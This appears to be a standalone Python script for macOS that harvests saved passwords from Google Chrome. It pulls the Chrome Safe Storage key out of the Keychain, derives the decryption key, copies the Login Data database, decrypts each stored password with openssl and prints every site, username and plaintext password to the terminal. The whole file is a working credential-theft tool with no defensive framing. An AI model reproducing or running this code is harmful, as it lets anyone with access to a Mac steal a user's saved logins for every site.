#!/usr/bin/env python3
import base64
import binascii
import glob
import hashlib
import os
import shutil
import sqlite3
import subprocess
import sys

loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
if len(loginData) == 0:
    loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~"))  # attempt default profile

safeStorageKey = subprocess.run(
    "security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True, text=True, capture_output=True).stdout.strip().replace("\"", "")

if not safeStorageKey:
    print("ERROR getting Chrome Safe Storage Key")
    sys.exit()


def chromeDecrypt(encrypted_value, iv, key=None):
    hexKey = binascii.hexlify(key).decode()  # Convert bytes to string
    hexEncPassword = base64.b64encode(encrypted_value[3:]).decode()  # Convert bytes to string
    print(f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {hexKey} <<< {hexEncPassword} 2>/dev/null")
    try:
        decrypted = subprocess.run(
            f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {hexKey} <<< {hexEncPassword} 2>/dev/null",
            shell=True, text=True, capture_output=True).stdout
    except Exception as e:
        decrypted = "ERROR retrieving password"
    return decrypted


def chromeProcess(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16)  # salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm

    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey.encode(), b'saltysalt', 1003)[:16]
    # GgHQB3Q/rUzY3lvFPt1vfwo=
    # qEWNFW8zi+O+3B0haZ4UPQ==
    print(base64.b64encode(key))
    shutil.copy(loginData, '/tmp/1.db')  # Copy the file to /dev/fd

    fd = os.open("/tmp/1.db", os.O_RDONLY)  # open as read only
    database = sqlite3.connect(f'/dev/fd/{fd}')
    os.close(fd)

    sql_count = 'select count(*) from logins'
    count = database.execute(sql_count).fetchone()[0]
    print(f"[*] 找到 {count} 条记录")

    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []


    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or encryptedPass[:3] != b'v10':  # user will be empty if they have selected "never" store password
                continue
            else:
                urlUserPassDecrypted = (
                    url,
                    user,
                    chromeDecrypt(encryptedPass, iv, key=key)
                )
                decryptedList.append(urlUserPassDecrypted)
    return decryptedList


for profile in loginData:
    for i, x in enumerate(chromeProcess(safeStorageKey, f"{profile}")):
        print(f"\033[32m[{i + 1}]\033[0m \033[1m{x[0]}\033[0m\n\t\033[32mUser\033[0m: {x[1]}\n\t\033[32mPass\033[0m: {x[2]}")
